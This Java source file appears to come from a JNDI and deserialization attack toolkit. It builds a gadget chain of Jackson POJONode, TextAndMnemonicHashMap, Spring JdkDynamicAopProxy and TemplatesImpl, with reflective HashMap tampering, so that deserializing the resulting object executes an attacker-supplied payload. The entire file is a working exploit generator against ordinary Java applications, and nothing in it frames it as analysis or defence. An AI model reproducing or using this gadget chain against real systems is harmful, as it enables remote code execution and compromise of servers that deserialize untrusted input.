package sonomon.jndi.deser.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Modifier;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import javax.xml.transform.Templates;
import org.springframework.aop.framework.AdvisedSupport;
import sonomon.jndi.deser.Reflections;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class Jackson_TextAndMnemonicHashMap_JdkDynamicAopProxy_Templates implements SerializeObject{
	//jackson4_100
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(tempImpl);
        Constructor constructoraop = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructoraop.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructoraop.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
		
		
        POJONode pnode = new POJONode(proxy);
        POJONode pnode2 = new POJONode(proxy);
        
        //jdk1.7不能生成ser,HashMap.put报空指针,但可以成功反序列化
        
        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        tHashMap1.put(pnode,null);
        tHashMap2.put(pnode2,null);
        Reflections.setFieldValue(tHashMap1,"loadFactor",1);
        Reflections.setFieldValue(tHashMap2,"loadFactor",1);
        HashMap hashMap = new HashMap();
        Class node = Class.forName("java.util.HashMap$Node");
        Constructor constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        Object node1 = constructor.newInstance(0, tHashMap1, null, null);
        Object node2 = constructor.newInstance(0, tHashMap2, null, null);
        Field key = node.getDeclaredField("key");
        Field modifiers = Field.class.getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(key, key.getModifiers() & ~Modifier.FINAL);
        key.setAccessible(true);
        key.set(node1, tHashMap1);
        key.set(node2, tHashMap2);
        Field size = HashMap.class.getDeclaredField("size");
        size.setAccessible(true);
        size.set(hashMap, 2);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        Object arr = Array.newInstance(node, 2);
        Array.set(arr, 0, node1);
        Array.set(arr, 1, node2);
        table.set(hashMap, arr);
        
        return hashMap;
    }
}